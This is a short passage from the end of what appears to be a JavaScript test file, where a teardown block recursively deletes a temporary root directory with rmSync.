    rmSync(root, { recursive: true, force: true });
  }
});
